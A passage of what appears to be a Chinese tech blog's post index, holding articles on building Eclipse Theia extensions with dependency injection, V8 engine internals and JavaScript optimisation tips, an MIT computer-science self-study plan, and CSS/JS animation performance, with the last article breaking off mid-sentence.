package.json 中添加 npm 包的依赖项来使用扩展包，扩展包能够在运行时安装和卸载，这将触发重新编译和重启。通过 DI 模块，扩展包能提供从类型到具体实现的绑定，即提供服务和功能。 依赖注入（DI）控制反转（Inversion of Control，缩写为IoC），是面向对象编程中的一种设计原则，可以用来减低计算机代码之间的耦合度。其中最常见的方式叫做依赖注入（Dependency Injection，简称DI），还有一种方式叫“依赖查找”（Dependency Lookup）。通过控制反转，对象在被创建的时候，由一个调控系统内所有对象的外界实体，将其所依赖的对象的引用传递(注入)给它。 Theia 使用IOC框架 Inversify.js 来连接不同的拓展。Inversify.js 使用装饰器 @injectable，@inject 等常用装饰器表示一个类可以被注入和必须注入哪些其他类, 利用元数据对多个对象进行引用传递，而不是 DI 在创建时注入组件(作为构造函数的参数)，从而将组件从依赖项中彻底解耦出来。DI 容器根据你在启动时通过所谓的容器模块提供的配置项来进行创建。 例如，Navigator 小部件需要访问 FileSystem 用来在树形结构中显示文件夹和文件，但是 FileSystem 接口的实现对 Navigator 来说并不重要，它可以大胆地假设与 FileSystem 接口一致的对象已经准备好并可以使用了。在 Theia 中，FileSystem 的实现仅仅是一个发送 JSON-RPC 消息到后端的代理，它需要一个特殊的配置和处理程序。Navigator不需要关心这些细节，因为它将获取一个被注入的 FileSystem 的实例。此外，这种结构的解耦和使用，允许扩展包在需要时能提供非常具体的功能实现，例如这里提到的 FileSystem，而不需要接触到 FileSystem 接口的任何实现。 根据 《Authoring Theia Extensions》的文档创建 Extension 工程。 1234npm install -g yo generator-theia-extension //官方的拓展生成工具mkdir theia-hello-world-extensioncd theia-hello-world-extensionyo theia-extension 在 Theia 中一个 Extension 定义了一个或者多个 DI 模块，需要在 Extension 目录下的 package.json 的 theiaExtensions 字段中将路径导出，例如 123456789101112{ \"keywords\": [ \"theia-extension\" //Extension 关键词 ], \"theiaExtensions\": [ { \"frontend\": \"lib/browser/monaco-browser-module\", \"frontendElectron\": \"lib/electron-browser/monaco-electron-module\" // 导出的DI模块路径, Theia 启动时会按照 key值将Extension分配到前/后端 } ]} 据模块最终运行的环境可以分为：frontend、frontendElectron、backend、backendElectron 四类。 theia-hello-world-extension-frontend-module.ts 实现如下： 12345678910111213import { TheiaHelloWorldExtensionCommandContribution, TheiaHelloWorldExtensionMenuContribution } from './theia-hello-world-extension-contribution';import { CommandContribution, MenuContribution} from \"@theia/core/lib/common\";import { ContainerModule } from \"inversify\";export default new ContainerModule(bind =&gt; { // add your contribution bindings here bind(CommandContribution).to(TheiaHelloWorldExtensionCommandContribution); bind(MenuContribution).to(TheiaHelloWorldExtensionMenuContribution);}); 在 ContainerModule 中绑定 CommandContribution(命令扩展点)、MenuContribution(菜单扩展点) 类型的扩展点。CommandContribution 接口定义了 registerCommands 方法，MenuContribution 接口定义了 registerMenus 方法。自定义 Extension 具体实现如下： 123456789101112131415161718192021222324252627282930313233import { injectable, inject } from \"inversify\";import { CommandContribution, CommandRegistry, MenuContribution, MenuModelRegistry, MessageService } from \"@theia/core/lib/common\";import { CommonMenus } from \"@theia/core/lib/browser\";export const TheiaHelloWorldExtensionCommand = { id: 'TheiaHelloWorldExtension.command', label: \"Say Hello\"};@injectable()export class TheiaHelloWorldExtensionCommandContribution implements CommandContribution { constructor( @inject(MessageService) private readonly messageService: MessageService, ) { } registerCommands(registry: CommandRegistry): void { registry.registerCommand(TheiaHelloWorldExtensionCommand, { execute: () =&gt; this.messageService.info('Hello, world!') }); }}@injectable()export class TheiaHelloWorldExtensionMenuContribution implements MenuContribution { registerMenus(menus: MenuModelRegistry): void { menus.registerMenuAction(CommonMenus.EDIT_FIND, { commandId: TheiaHelloWorldExtensionCommand.id, label: TheiaHelloWorldExtensionCommand.label }); }} 12cd browser-appyarn start &lt;path to workspace&gt; 本地启动后在菜单 Edit-&gt; Say Hello, 点击后就会出现Hello World! Plug-insTheia 和 VS Code 拓展能力区别较大，Theia 通过 Extension 机制提供对应用内部的拓展能力，通过 Plug-ins 机制提供外部的拓展能力；Theia 的 Plug-ins 机制和 VS Code 的拓展机制类似，同时 Theia Plug-ins 对 VS Code 拓展兼容支持。Plug-ins 相比 Extensions 的优势： 代码隔离：Plug-ins 作为插件在单独进程中运行的代码，它不能阻止 Theia 核心进程； 可以在运行时加载：无需重新编译Theia的完整IDE； 减少编译时间：Theia 应用引入的插件无需进行编译； 独立发布：插件可以打包成一个文件，然后直接加载，无需额外获取 npmjs 等的依赖项； API 方式开发：无需学习 inversify 或其他框架；API 向后兼容，可以轻松进行 Theia 版本升级。 另外 Theia 也做了很多便于迁移 VS Code Extension 的工作。比如下图: 可以看到 Theia 可以直接在 package.json 直接远程引用 VS Code 拓展。 Plug-ins 和 Extension 一样官方也提供了了生成工具, 具体的使用方式在此不做详述。 参考链接：https://github.com/eclipse-theia/theia https://eclipsesource.com/blogs/2018/06/20/welcome-at-eclipse-theia/ https://www.yuque.com/zhaomenghuan/theia/pbr2hx#HlTcf https://docs.google.com/document/d/1aodR1LJEF_zu7xBis2MjpHRyv7JKJzW7EWI9XRYCt48/edit# https://eclipsesource.com/blogs/2019/11/21/how-to-create-develop-an-eclipse-theia-ide-extension/","link":"/posts/b8644cfb.html"},{"title":"V8 引擎探索及编写最优代码的5个技巧","text":"How JavaScript works: an overview of the engine, the runtime, and the call stack 原文请查阅这里 本章将会深入谷歌 V8 引擎的内部结构。我们也会为如何书写更好的 JavaScript 代码提供几条小技巧－SessionStack 开发小组在构建产品的时候所遵循的最佳实践。 概述一个 JavaScript 引擎就是一个程序或者执行 JavaScript 代码的解释器。一个 JavaScript 引擎可以用作标准解释器或者即时编译器(JIT)，即时编译器即以某种形式把 JavaScript 解释为字节码。 以下是一系列实现 JavaScript 引擎的热门项目： V8－由谷歌开源的以 C++ 语言编写 Rhin－由 Mozilla 基金会主导，开源的，完全使用 Java 开发。 SpiderMonkey－初代 JavaScript 引擎，由在之前由网景浏览器提供技术支持，现在由 Firefox 使用。 JavaScriptCore－开源，以 Nitro 的名称来推广，并由苹果为 Safari 开发。 KJS－KDE 引擎，起先是由 Harri Porten 为 KDE 工程的 Konqueror 浏览器所开发。 Chakra (JScript9)－IE Chakra (JavaScript)－Microsoft Edge Nashorn－作为 OpenJDK 的一部分来开源，由 Oracle Java 语言和 Tool Group 编写。 JerryScript－一款轻量级的物联网引擎。 V8 引擎诞生源由V8 引擎(C++)是由谷歌开源, 内置于Google Chrome。不同于其它引擎， V8 引擎也被应用于时下流行的 Node.js 运行时。 起初 V8 是被设计用来优化网页浏览器中的 JavaScript 的执行性能。为了提高执行速度，V8 将 JavaScript 代码转化为更加高效的机器码而不是使用解释器。它通过即时编译器在运行阶段把 JavaScript 代码编译为机器码，就像诸如 SpiderMonkey 或者 Rhino (Mozilla) 等许多现代 JavaScript 引擎所做的那样。主要的区别在于 V8 不产生字节码或者任何的中间码。 V8 曾经拥有两个编译器在 V8 5.9诞生(2017 年初) 之前，引擎拥有两个编译器： full-codegen－一个简单且快速的编译器用来产出简单且运行相对缓慢的机器码。 Crankshaft－一个更复杂(即时)优化的编译器用来产生高效的代码。 V8 引擎内部使用多线程： 主线程－获取代码，编译后执行 独立线程－用作编译代码，所以当执行代码优化时主线程可以保持执行 性能检测线程－会告诉运行时我们在哪个方法上花了太多的时间，以便于让 Crankshaft 来进行优化 其他: 有几个线程用来处理垃圾回收器的清理工作。 Crankshaft: the marketing name of V8’s optimizing compiler 当第一次执行 JavaScript 代码的时候，V8 使用 full-codegen把将解析后的JavaScript直接转换成机器码。这使得它一开始就可以快速运行机器码。注意到 V8 没有使用中间字节码来表示，这样就不需要解释器了。 当代码已经执行一段时间后，性能检测器线程已经收集了足够多的数据来告诉 Crankshaft 哪个方法可以被优化。 接下来，在另一个线程中开始进行 Crankshaft 代码优化。它把 JavaScript 语法抽象树转化为一个被称为 Hydrogen 的高级静态单赋值并且试着优化这个 Hydrogen 图。大多数的代码优化在这一层完成。 内联第一个优化方法即是提前尽可能多地内联代码。内联指的是把调用地址(函数被调用的那行代码)置换为被调用函数的函数体的过程。这个简单的步骤使得接下来的代码优化更有意义。 隐藏类JavaScript 是基于原型的语言：当进行克隆的时候不会创建类和对象。JavaScript 也是一门动态编程语言，这意味着在它对象实例化之后，可以任意地添加或者移除属性。 大多数的 JavaScript 解释器使用类字典的结构(基于哈希函数)在内存中存储对象属性值的内存地址(即对象的内存地址)。这种结构使得在 JavaScript 中获取属性值比 Java 或者 C# 的非动态编程语言要更耗费时间。在 Java 中，所有的对象属性都在编译前由一个固定的对象布局所决定并且不能够在运行时动态添加或者删除(嗯， C# 拥有动态类型，这是另外一个话题)。因此，属性值(指向这些属性的指针)以连续的缓冲区的形式存储在内存之中，彼此之间有固定的位移。位移的长度可以基于属性类型被简单地计算出来，然而在 JavaScript 中这是不可能的，因为运行时可以改变属性类型。 由于使用字典在内存中寻找对象属性的内存地址的低效性，V8 转而使用隐藏类。隐藏类工作原理和诸如 Java 语言中使用的固定对象布局(类)相似，除了它们是在运行时创建的以外。现在，让我们看看他们的样子： 123456function Point(x, y) { this.x = x; this.y = y;}var p1 = new Point(1, 2); 一旦 “new Point(1,2)” 调用发生，V8 他创建一个叫做 “C0” 的隐藏类。 因为还没有为类 Point 创建属性，所以 “C0” 是空的。 一旦第一条语句 this.x = x 开始执行(在 Point 函数中), V8 将会基于 “C0” 创建第二个隐藏类。”C1” 描述了可以找到 x 属性的内存地址(相对于对象指针)。本例中，”x” 存储在位移 0 中，这意味着当以内存中连续的缓冲区来查看点对象的时候，位移起始处即和属性 “x” 保持一致。V8 将会使用 “类转换” 来更新 “C0”，”类转换” 即表示属性 “x” 是否被添加进点对象，隐藏类将会从 “C0” 转为 “C1”。以下的点对象的隐藏类现在是 “C1”。 每当对象添加新的属性，使用转换路径来把旧的隐藏类更新为新的隐藏类。隐藏类转换是重要的，因为它们使得以同样方式创建的对象可以共享隐藏类。如果两个对象共享一个隐藏类并且两个对象添加了相同的属性，转换会保证两个对象收到相同的新的隐藏类并且所有的优化过的代码都会包含这些新的隐藏类。 当运行 “this.y = y” 语句的时候，会重复同样的过程(还是在 Point 函数中，在 “this.x = x” 语句之后)。 一个被称为 “C2” 的隐藏类被创造出来，一个类转换被添加进 “C1” 中表示属性 “y” 是否被添加进点对象(已经拥有属性 “x”)之后隐藏会更改为 “C2”，然后点对象的隐藏类会更新为 “C2”。 隐藏类转换依赖于属性被添加进对象的顺序。如下： 123456789101112function Point(x, y) { this.x = x; this.y = y;}var p1 = new Point(1, 2);p1.a = 5;p1.b = 6;var p2 = new Point(3, 4);p2.b = 7;p2.a = 8; 现在，你会以为 p1 和 p2 会使用相同的隐藏类和类转换。然而，对于 “p1”，先添加属性 “a” 然后再添加属性 “b”。对于 “p2”，先添加属性 “b” 然后是 “a”。这样，因为使用不同的转换路径，”p1” 和 “p2” 会使用不同的隐藏类。在这种情况下，更好的方法是以相同的顺序初始化动态属性以便于复用隐藏类。 内联缓存V8 利用了另一项优化动态类型语言的技术叫做内联缓存。内联缓存依赖于对于同样类型的对象的同样方法的重复调用的观察。这里有一份深入阐述内联缓存的文章。 我们将接触内联缓存的一些主要概念(万一你没有时间去通读以上的深入理解内联缓存的文章)。 它是如何工作的呢？V8 会维护一份传入最近调用方法作为参数的对象类型的缓存，然后使用这份信息假设在未来某个时候这个对象类型将会被传入这个方法。如果 V8 能够很好地预判即将传入方法的对象类型，它就可以绕过寻找如何访问对象属性的过程，以使用储存的来自之前查找到的对象隐藏类的信息。 所以隐藏类的概念和内联缓存是如何联系在一起呢？每当在一个指定的对象上调用方法的时候，V8 引擎不得不执行查找对象隐藏类的操作，用来取得访问指定属性的位移。在两次对于相同隐藏类的相同方法的成功调用之后，V8 忽略隐藏类的查找并且只是简单地把属性的位移添加给对象指针自身。在之后所有对这个方法的调用，V8 引擎假设隐藏类没有改变，然后使用之前查找到的位移来直接跳转到指定属性的内存地址。这极大地提升了代码运行速度。 内存缓存也是为什么同样类型的对象共享隐藏类是如此重要的原因。当你创建了两个同样类型的对象而使用不同的隐藏类(正如之前的例子所做的那样)，V8 将不可能使用内存缓存，因为即使相同类型的两个对象，他们对应的隐藏类为他们的属性分派不同的地址位移。 这两个对象基本上是一样的但是创建 “a” 和 “b” 的顺序是不同的 编译为机器码一旦优化了 Hydrogen 图，Crankshaft 降低到一个被称为“Lithium”较低级别的表示。大多数 Lithium 的实现都是依赖于指定的架构。寄存器分配发生在这一层。 最后，Lithium 会被编译为机器码。之后发生 OSR：堆栈替换(on-stack replacement)。在开始编译和优化一个明显的耗时的方法之前，过去极有可能去运行它。V8 不会忘记代码执行缓慢的地方，而再次使用优化过的版本代码。相反，它会转换所有的上下文(堆栈，寄存器)，这样就可以在执行过程中切换到优化的版本代码。这是一个复杂的任务，你只需要记住的是，在其它优化过程中，V8 会初始化内联代码。V8 并不是唯一拥有这项能力的引擎。 这里有被称为逆优化的安全防护，以防止当引擎所假设的事情没有发生的时候，可以进行逆向转换和把代码反转为未优化的代码。 垃圾回收V8 使用传统的标记-清除技术来清理老旧的内存以进行垃圾回收。标记阶段会中止 JavaScript 的运行。为了控制垃圾回收的成本并且使得代码执行更加稳定，V8 使用增量标记法：不遍历整个内存堆，试图标记每个可能的对象，它只是遍历一部分堆，然后重启正常的代码执行。下一个垃圾回收点将会从上一个堆遍历中止的地方开始执行。这会在正常的代码执行过程中有一个非常短暂的间隙。之前提到过，清除阶段是由单独的线程处理的。 Ignition 和 TurboFan随着 2017 早些时候 V8 5.9 版本的发布，带来了一个新的执行管道。新的管道获得了更大的性能提升和在现实 JavaScript 程序中，显著地节省了内存。 新的执行管道是建立在新的 V8 解释器 Ignition 和 V8 最新的优化编译器 TurboFan 之上的。 你可以查看 V8 小组的博文。 自从 V8 5.9 版本发布以来，full-codegen 和 Crankshaft(V8 从 2010 开始使用至今) 不再被 V8 用来运行JavaScript，因为 V8 小组正努力跟上新的 JavaScript 语言功能以及为这些功能所做的优化。 这意味着接下来整个 V8 将会更加精简和更具可维护性。 网页和 Node.js benchmarks 评分的提升 这些提升只是一个开始。新的 Ignition 和 TurboFan 管道为未来的优化作铺垫，它会在未来几年内提升 JavaScript 性能和缩减 Chrome 和 Node.js 中的 V8 痕迹。 最后，这里有一些如何写出优化良好的，更好的 JavaScript 代码。你可以很容易地从以上的内容中总结出来，总结： 如何写优化的 JavaScript 代码 对象属性的顺序：总是以相同的顺序实例化对象属性，这样隐藏类及之后的优化代码都可以被共享。 动态属性：实例化之后为对象添加属性会致使为之前隐藏类优化的方法变慢。相反，在对象构造函数中赋值对象的所有属性。 方法：重复执行相同方法的代码会比每次运行不同的方法的代码更快(多亏了内联缓存)。 数列：避免使用键不是递增数字的稀疏数列。稀疏数列中没有包含每个元素的数列称为一个哈希表。访问该数列中的元素会更加耗时。同样地，试着避免预先分配大型数组。最好是随着使用而递增。最后，不要删除数列中的元素。这会让键稀疏。 标记值：V8 用 32 位来表示对象和数字。它使用一位来辨别是对象(flag=1)或者是被称为 SMI(小整数) 的整数(flag=0)，之所以是小整数是因为它是 31 位的。之后，如果一个数值比 31 位还要大，V8 将会装箱数字，把它转化为浮点数并且创建一个新的对象来存储这个数字。尽可能试着使用 31 位有符号数字来避免创建 JS 对象的耗时装箱操作。 相关链接 https://www.open-open.com/lib/view/open1437661700287.html","link":"/posts/84794ca2.html"},{"title":"MIT Challenge","text":"作为一名野生程序员, 其实非常羡慕科班出身4年以上的计算机科学基础。 前端这些年看似百花齐放，各种框架,工具层出不穷但其实并没有太多新鲜的东西。 相反计算机科学基础相当长一段时间都没有大变化,基础才是真的决定了你可能达到的高度。 有了这样的想法, 决定先参考MIT的计算机专业本科课程并制定学习计划来弥补我薄弱的计算机基础。 事实证明,当你有一个想法时,大概率会有很多人已经做过… 国外有个博主 Scott Young 在2011年开始花了 1 年学完麻省理工 4 年计算机本科33门课程(有一门8.01 Classical Mechanics是之前学的)。他的 MIT 挑战也在他本人的博客上作了详细说明。 尽管 Scott 给出了评分标准, 但是实际学习的效果还是很难评估。 但是看了他的其他视频和博客, 的确他在学习能力这方面是毋庸置疑。 兼听则明，偏信则暗。 为了修正学习计划,我先到相关网站(知乎, quora, 油管)上看了其他人的部分评价。 整体反对的声音如下: 课程只是学业的一部分, 除了教科书内容, 还有各种形式的项目, 团队协作; 缺乏人文课程, 交流密集型课程及高级本科课程（AUS）, 不算是MIT CS的完整教育。 资源: 缺乏课堂以外的资源。 MIT自带庞大的资源, 研究成果, 实验室, 师资等力量不可能从在网课方式上获得; 课程通过评分标准过低 50%, 且自己又踢球又当裁判; 时间太快: 短时间的学习后达到考试或类似问题后，知识就消失了。 因为他可以立即测试他的知识，而只需要在很短的时间内掌握该知识即可。无法确定这种方式是否对他真正有用。 利益相关: 最重要的一点, Scott Young 是卖有关学习生产力之类的书籍, 这个项目用于宣传自己的成功，展示他如何以“ 4倍的速度”和 “1/100的花费” 完成MIT CS课程的工作符合他的财务和市场利益。 尽管Scott实际达到的学习效果不一定有他宣传的那个程度, 但还是有不少肯定的声音, MIT Challenge 无疑是他最成功的项目之一。 他成功地使用在线免费资源来按自己的步调学习了很多有关计算机科学的知识，这对于那些试图在不上大学的情况下学习更多知识的人来说非常有借鉴意义, 所以我也有样学样立个 FLAG, 打算给自己也来一个 MIT Challenge。 Scott是为了宣传自己的博客和书所设的项目, 为了尽量还原CS本科课程按照MIT一样的学分制。 我作为入行有段时间的前端,主要是想扩展计算机科学基础。因为学习的目的不同, 所以课程表的设计也要有所侧重。 基于他的课表参考, 首先要注意几个问题: 小部分课程比较老旧, 需要更新; 不需要为了修够学分选择物理, 力学, 生物, 甚至经济学之类和计算机类联系较弱的基础课程, 数学优先级稍微高一点, 如果是计算机科学类的前置课程就需要加进课程, 否则根据实际情况灵活调整; MIT CS课程是涵盖了电气工程偏硬件方向, 我会选择跳过大多数电气工程课程，而将重点更多地放在CS上; 人类社科类, 交流密集型课程,独立资讯项目该抛弃还是得抛弃。 还有些课程无法评估（包括实验室和研究课程），而另一些则无法在线访问,根据实际情况而定。 总体来说, 课程数目会变少, 因为是业余时间学习周期也会变长, 因此在评分的标准上要更高一点; MIT的CS课程相比其他会梗侧重数学和理论知识, 根据课程实际习题情况, 可能会自行结合一些个人感兴趣的编程相关项目来作为拓展补充; 先到 MIT 官网上查看最新的CS本科教案..恩找到了一份 roadmap 直接拿来用好了。 课程编号 课程名称 类别 方案 6.0001 Introduction to Computer Science Programming in Python introductory subjects 先简单过一遍, 如果内容已经大部分知晓就酌情跳过或选用熟悉的编程语言完成练习 6.042[J] Mathematics for Computer Science introductory subjects 6.02 Introduction to EECS via Digital Communication introductory subjects Introduction to EECS 6.01 or 6.02 or 6.03 or 6.08, 本来选6.03，但是公开课只找到 6.02 且前置课程较少 6.006 Introduction to Algorithms foundation subjects 6.004 Computation Structures foundation subjects 6.009 Fundamentals of Programming foundation subjects 基本上是编程课进阶, 目前不需要学习了(ocw上找不到资源了, 直接学6.005即可) 6.005 Elements of Software Construction(Software Construction) header subjects 6.033 Computer Systems Engineering header subjects/CI-M课程 6.034 Artificial Intelligence header subjects 人工智能相关优先级不是很高, 不选6.036是因为还多一门前置课程 Calculus II (GIR) 6.046[J] Design and Analysis of Algorithms header subjects 6.207[J] Networks advanced undergraduate subjects 6.035 Computer Language Engineering advanced undergraduate subjects 6.S081 Introduction to Operating Systems foundation subjects 在课表6-3: Computer Science and Engineering没有找到操作系统, 补充的基础课程 6.828 Operating System Engineering advanced undergraduate subjects 同上, 根据实际情况计划学习, 补充的高级课程 第一期暂定课程 13门, 包括入门科目三门, 基础科目4门, header subjects(更高级的学科?翻译不出来)4门, 高级课程2门(感兴趣的高级课程有很多, 暂选了前端相关的网络和一门感兴趣的编译相关); 时间: 一年 学习顺序: 课程顺序由简到难, 完成前置课程后才能继续对应课程, 可能会存在计划以外的其他前置课程, 非数学,计算机类只看出现的相关概念, 其他酌情增加; 教材选择: 能在OCW上找到视频是最好滴, 次选教材课本及其他资料, 实在找不到只能考虑选替代的课 学习方法: 目录, 内容快速过一遍, 习题作业也过一遍决定该科目是练习题类or项目类, 再决定是否需要替换课程或者结合一些个人感兴趣的编程相关项目 使用费曼技巧精读第二遍:1.选择要理解的概念,拿一张空白的纸，在页面顶部写下该概念的名称3.对自己讲解它一样进行解释,一个经常拿来举例子的对象, 扫地阿姨…4.每当遇到困难时，请返回参考资料，讲座或助教，然后重新阅读或重新学习该资料，直到获得足够的知识以至于可以在纸上进行解释5.每当您写下某些东西的冗长或令人困惑的解释时，请尝试简化该语言，或者创建一个类比以更好地理解它6.如果您想更好地理解某件事或记住得更好，请进一步尝试开发，简化和完善说明7.对所学知识的一个很好的自我测试是：在不看任何参考资料的情况下，通过技巧来进行学习，看看是否可以深入地解释它 完成习题,项目,考试评分标准达到 60%以上 因为是个前端,为了恰饭,工作需要的东西该学还是得学。 所以这项目只能利用业余时间完成, 计算机基础知识的长远投资价值比较大,细水长流吧, 能解决你很多高层次不懂的问题，让你学习计算机方面的知识更加省力；数学方面当然也很重要, 但是实用至上, 需要多少补多少。 通过思考和实践将计算机基础真正成为自己的东西, 作为一种长期习惯将知识引入工作。 虽然计划是基于 MIT CS 本科课程设计, 但目的不是为了证明获得MIT毕业生同等学历之类。 纯粹是为了和自己的过往水平进行比较, 提高计算机科学素养的一种低成本方式。 如果有幸能完成的话, 再考虑其他高级课程, 数学甚至研究生课程也不一定。 There is nothing noble in being superior to your fellow man. True nobility is being superior to your former self. MIT课程参考链接: http://student.mit.edu/catalog/m6c.html http://catalog.mit.edu/ https://ocw.mit.edu/courses/electrical-engineering-and-computer-science/","link":"/posts/6cd4881c.html"},{"title":"CSS和JS动画底层原理及其性能优化","text":"How JavaScript works: Under the hood of CSS and JS animations + how to optimize their performance 原文请查阅这里。 概述正如你所知，动画在创建卓越网络应用中扮演着一个关键角色。由于用户越来越注重体验，企业开始意识到完美，令人愉悦的用户体验的重要性，结果网络应用变得越来越重并且拥有更多动态交互的功能。这就要求网络应用提供更加复杂的动画来实现平滑的状态过渡贯穿于用户的使用过程当中。现在，这已经司空见惯。用户变得越来越挑剔，他们默认希望获得快速响应和良好交互的用户界面。 界面极具动画特色不一定是件简单的事情。动画的时机，方面及采用何种动画效果都是很模糊的概念。 JavaScript 和 CSS 动画比较JavaScript 和 CSS 是创建网页动画的两条主要途径。两种方式不分对错，根据实际需求选择。 CSS 动画使用 CSS 动画是元素在屏幕上移动的最简单方法。 我们将会以如何让元素在 X 和 X 座标上移动元素 50 像素作为小示例开始。通过持续 1 秒的 CSS 过渡来移动元素。 123456789101112.box { -webkit-transform: translate(0, 0); -webkit-transition: -webkit-transform 1000ms; transform: translate(0, 0); transition: transform 1000ms;}.box.move { -webkit-transform: translate(50px, 50px); transform: translate(50px, 50px);} 当为元素添加 move 类名时，改变 transform 的值然后开发发生过渡效果。 除了过渡持续时间，还有 easing 参数，它主要负责动画体验。该参数会在之后详细介绍。 如果通过以上 CSS 代码片段可以创建单独的样式类来操作动画，那么也可以使用 JavaScript 来切换每个动画。 如下元素： 123&lt;div class=\"box\"&gt; Sample content.&lt;/div&gt; 然后，使用 JavaScript 来开/关每个动画。 1234567var boxElements = document.getElementsByClassName('box'), boxElementsLength = boxElements.length, i;for (i = 0; i &lt; boxElementsLength; i++) { boxElements[i].classList.add('move');} 以上代码片段为每个包含 box 类的元素添加 move 类来触发动画。 这样做可以很好为你的网络应用提供平衡。你可以专注于使用 JavaScript 来操作应用状态，然后只需为目标元素设置合适的类，让浏览器来处理动画。如若你选择这么处理，就可以监听元素的 transitionend 事件，除了还需处理 IE 老版本浏览器兼容问题。 如下监听 transitioned 事件，该事件会在动画结束时触发。 123456var boxElement = document.querySelector('.box'); // 获取第一个包含 box 类的元素boxElement.addEventListener('transitionend', onTransitionEnd, false);function onTransitionEnd() { // Handle the transition finishing.} 除了使用 CSS 过渡，还可以使用 CSS 动画，CSS 动画可以让你更好地控制单独的动画关键帧，持续时间以及循环次数。 关键帧是用来通知浏览器在规定的时间点上应有的 CSS 属性值然后填充空白。 看下例子： 1234567891011121314151617181920212223242526272829303132333435363738/** * 该示例是没有包含浏览器前缀的精简版。加上以后会更加准确些。 * */.box { /* 选择动画名称 */ animation-name: movingBox; /* 动画时长 */ animation-duration: 2300ms; /* 动画循环次数 */ animation-iteration-count: infinite; /* 每次奇数次循环时反转动画 */ animation-direction: alternate;}@keyframes movingBox { 0% { transform: translate(0, 0); opacity: 0.4; } 25% { opacity: 0.9; } 50% { transform: translate(150px, 200px); opacity: 0.2; } 100% { transform: translate(40px, 30px); opacity: 0.8; }} 效果示例－https://sessionstack.github.io/blog/demos/keyframes/ 通过使用 CSS 动画定义独立于目标元素的动画本身，然后设置元素的 animation-name 属性来使用想要的动画效果。 CSS 动画仍需加浏览器前缀，在 Safari, Safari 移动浏览器和 Android 端添加 -webkit- 前缀。Chrome, Opera, Internet Explorer, and Firefox 端全部不需要添加前缀。有很多工具可以用来创建包含任意前缀的样式，这样就不需要在源文件中带样式前缀。 可以使用 autoprefixer 或者 cssnext 来自动为样式添加前缀。 JavaScript 动画和 CSS 过渡或者 CSS 动画相比，使用 JavaScript 来创建动画要更加复杂些，但是一般而言，它会为开发进行提供强大的功能。 一般情况下，可以内联 JavaScript 动画作为代码的一部分。也可以把它们封装在其它对象之中。以下为复现之前描述的 CSS 过渡的 JavaScript 代码： 12345678var boxElement = document.querySelector('.box');var animation = boxElement.animate([ {transform: 'translate(0)'}, {transform: 'translate(150px, 200px)'}], 500);animation.addEventListener('finish', function() { boxElement.style.transform = 'translate(150px, 200px)';}); 默认情况下，网页动画只是修改了元素的展示效果。如果想要让元素停留在其移动到的目标位置，那么就得在动画结束的时候修改其底层样式。这也是为什么在以上的示例中监听 finish 事件然后设置box.style.transform 属性为 translate(150px, 200px) 的原因，该属性值和 CSS 动画执行的第二个样式转换是一样的。 通过 JavaScript 动画，可以完全控制每一步元素的样式。这意味着可以随心所欲地减速，暂停，停止或者翻转动画进而操作目标元素。由于可以适当地封装动画行为，所以当在构建复杂面向对象应用程序的时候会特别有用。 Easing 定义自然平滑地移动会让网络应用拥有更好的用户体验。 自然条件下，没有事物可以线性地从一个点移动到另一个点。现实生活中，在我们周围的物理世界中物体在移动的时候会加速或减速，因为我们并不生活在真空状态下且有不同的因素来影响事物的运行状态。人类的大脑会期望感受这样的移动，所以当为网络应用制作动画的时候，利用此类知识会对开发有帮助。 这是你所应该理解的术语： 『ease in』－开始移动缓慢而后加速 『ease out』－开始移动迅速而后减速 可以合并两个动画，比如 『ease in out』。 Easing 可以使得动画更加自然平滑。 Easing 关键字可以为 CSS 过渡和动画选择任意的 easing 方法。不同的关键字会影响动画的 easing。你也可以完全自定义 easing 方法。 以下为可以选择用来控制 easing 的 CSS 关键字： linear ease-in ease-out ease-in-out 让我们深入了解并查看他们的效果。 Linear 动画不使用任何的 easing 方法的动画即为 linear。 以下为 linear 过渡效果的图示： 值随着时间流逝，值等比增加。使用 linear 动效，会让动画不自然。一般来说，避免使用 linear 动效。 使用如下代码实现一个简单的线性动画： transition: transform 500ms linear; Ease-out 动画正如前所述，和 linear 对比，easing out 让动画快速启动，结束时会减速。以下为图示： 总之，easing out 是最适合做界面体验的，因为快速地启动会给人以快速响应的动画的感觉，而结束时让人感觉很平滑这得归功于不一致的移动速度。 有很多的方法来实现 ease out 动画效果，而最简单的即为 CSS 中的 ease-out 关键字。 transition: transform 500ms ease-out; Ease-in 动画和 ease-out 动画相反－其启动慢然后结束时变快。图示如下： 和 ease-out 动画比较，由于他们启动缓慢给人以反应卡顿的感觉，所以 ease-in 让人感觉动画不自然。动画结束时很快给人一种奇怪的感觉，因为整个动画一直在加速，而现实世界中当事物突然停止运动的时候会减速而不是加速。 和 ease-out 和 linear 动画类似，使用 CSS 关键字来实现 ease-in 动画： transition: transform 500ms ease-in; Ease-in-out 动画该动画为 ease-in 和 ease-out 的合集。图示如下： 不要设置动画持续时间过长，否则会给人一种界面未响应的感觉。 使用 ease-in-out CSS 关键字来实现 ease-in-out 动画： transition: transform 500ms ease-in-out; 自定义 easing你可以自定义自己的 easing 曲线，可以更有效地控制项目中的动画。 实际上， ease-in，linear 及 ease 关键字映射到预定义贝塞尔曲线 ，可以在 CSS transitions specification 和 Web Animations specification 中查找更多关于贝塞尔曲线的内容。 贝塞尔曲线让我们看一下贝塞尔曲线的运行原理。一条贝塞尔曲线包含四个点，或者准确地说是包含两组数值。每一对数值内包含表示三次贝塞尔曲线控制点的 X 和 Y 坐标。贝塞尔曲线的起点坐标为 (0, 0) ，终点坐标为 (1, 1)。可以设置两组数值对。每个控制点的 X 轴值必须在 [0, 1] 之间，而 Y 轴值可以超过 [0, 1]，虽然规范并没有明确允许超过的数值。即使每个控制点的 X 和 Y 值的微小差异都会输出完全不同的贝塞尔曲线。 贝塞尔曲线的说明。 看下两张拥有相近但不同坐标的控制结点的贝塞尔曲线图。 和 如你所见，两张图有很大不同。第一个控制点矢量差异为 (0.045, 0.183)，而第二个控制点矢量差异为 (-0.427, -0.054)。 第二条曲线的样式为： transition: transform 500ms cubic-bezier(0.465, 0.183, 0.153, 0.946); 第一组数值为起始控制点的 X 和 Y 坐标而第二组数值为第二个控制点的 X 和 Y 坐标。 性能优化你得维持动画帧数为 60 帧每秒，否则会影响到用户体验。 和世界上其它事物一样，动画会有性能开销。一些属性的动画性能开销相比其它属性要小。比如，为元素的 width 和 height 做动画会更改其几何结构并且可能会造成页面上的其它元素移动或者大小的改变。这一过程被称为布局。之前渲染引擎中有详细介绍过布局和渲染。 总之，应该尽量避免为会引起布局和绘制的属性做动画。对于大多数现代浏览器而言，即把动画局限于 opacity 和 transform 属性。 Will-change可以使用 will-change 